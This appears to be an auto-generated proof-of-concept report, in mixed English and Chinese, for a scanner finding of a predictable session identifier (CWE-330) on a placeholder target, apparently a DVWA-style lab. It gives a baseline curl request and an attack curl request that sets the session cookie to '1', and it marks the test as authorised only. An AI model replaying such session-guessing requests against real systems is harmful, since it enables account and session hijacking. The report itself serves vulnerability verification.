# POC — AWVS: Predictable Session Identifier

- finding_id: `URL-16f2ca5d7382`
- type: `weak_id` / CWE-330
- severity: `high`
- file: `:0`

## 步骤

1. **Baseline request**  
```http
curl -sS -i -X POST 'http://TARGET:8080/048.php' \
  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \
  -H 'Accept: */*' \
  -H 'Cookie: dvwaSession=SafeText'
```
预期：HTTP 200 and the normal application response.

2. **Replay the AWVS attack request (弱 ID / 可预测会话标识)**  
```http
curl -sS -i -X POST 'http://TARGET:8080/048.php' \
  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \
  -H 'Accept: */*' \
  -H 'Cookie: dvwaSession=1'
```
预期：The attack response differs from the baseline in status, length, or a security-relevant marker.

3. **Compare baseline and attack responses**  
预期：A security-relevant differential appears.

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。